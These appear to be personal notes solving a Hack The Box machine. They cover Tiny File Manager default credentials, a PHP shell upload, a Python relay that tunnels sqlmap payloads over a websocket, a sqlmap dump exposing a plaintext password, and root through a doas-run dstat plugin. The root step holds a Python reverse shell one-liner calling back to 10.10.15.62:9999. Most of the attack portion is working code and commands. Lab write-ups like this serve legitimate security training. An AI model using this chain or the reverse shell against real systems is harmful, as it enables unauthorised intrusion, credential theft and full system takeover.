### Tiny File Manager
V : 2.4.3
Default Credentials: admin/admin@123

![[Pasted image 20230307205333.png]]

(Writable folder?)
/var/www/html/tiny/tinyfilemanager.php
/var/www/html/tiny/uploads/tinyfilemanager.php


## Getting user

Create Folder -> Upload php shell to newly created folder -> Reverse shell 

Got to use this article to abuse websocket: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

Final py:
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:7001/?id=*")

try:
	middleware_server(('0.0.0.0',7001))
except KeyboardInterrupt:
	pass

```

Dumping using sqlmap:
```bash
sqlmap -u 'http://localhost:7001/?id=90338' --threads 10 --dbms=MySQL -D soccer_db --dump-all
<<>>
+---------+-------------------+----------------------+----------+
| id      | email             | password             | username |
+---------+-------------------+----------------------+----------+
| 1324    | player@player.htb | PlayerOftheMatch2022 | AAAA??   |
| <blank> | <blank>           | <blank>              | <blank>  |
+---------+-------------------+----------------------+----------+
<<>>
```

htb : PlayerOftheMatch2022

### Root
Command for root:
doas -u root /usr/bin/dstat --rev

rev.py
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.62",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```

Copy dstat_rev.py -> usr/local/share/dstat/
Run dstat
